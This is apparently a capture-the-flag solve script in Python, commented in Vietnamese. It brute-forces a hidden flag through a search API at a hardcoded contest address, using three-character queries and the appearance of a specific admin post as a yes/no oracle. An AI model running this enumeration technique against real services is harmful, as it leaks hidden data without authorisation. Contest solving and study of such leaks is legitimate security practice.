import requests

charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}!@#$%^&*()-+=[]|;:,.<>?~`'
discovered = 'L3AK{L3ak1ng_there'  # chuỗi đã dò được ban đầu

# Lưu các ký tự đã thử tại từng vị trí tiếp theo (index trong discovered là vị trí của ký tự mới)
tried_chars_at_pos = {}

def test_triplet(query):
    try:
        res = requests.post('http://34.134.162.213:17000/api/search', json={'query': query})
        data = res.json()
        for post in data.get('results', []):
            if (post['title'] == "Not the flag?" and
                post['author'] == "admin" and
                post['date'] == "2025-05-13" and
                post['content'].startswith("Well luckily the content of the flag is hidden")):
                return True
    except Exception as e:
        print(f"Error during request: {e}")
    return False

def triplet_already_in_discovered(triplet, discovered):
    # Kiểm tra triplet này đã từng xuất hiện trong discovered chưa
    return triplet in discovered

while True:
    pos = len(discovered)  # vị trí ký tự tiếp theo sẽ thêm vào
    if pos not in tried_chars_at_pos:
        tried_chars_at_pos[pos] = set()

    found = False
    # Lấy 2 ký tự cuối của discovered để tạo triplet mới cùng với c thử
    last_two = discovered[-2:]

    for c in charset:
        if c in tried_chars_at_pos[pos]:
            # Đã thử c ở vị trí này, bỏ qua
            continue

        triplet = last_two + c

        # Tránh thử triplet đã từng có trong discovered để tránh lặp vô tận
        if triplet_already_in_discovered(triplet, discovered):
            # Bạn có thể comment dòng này nếu muốn cho phép lặp triplet
            continue

        if test_triplet(triplet):
            discovered += c
            tried_chars_at_pos[pos].add(c)
            print(f'Flag so far: {discovered}')
            found = True
            if c == '}':
                print('🎉 Flag fully discovered!')
                exit(0)
            break
        else:
            tried_chars_at_pos[pos].add(c)

    if not found:
        print('No more matching characters found at position', pos)
        break
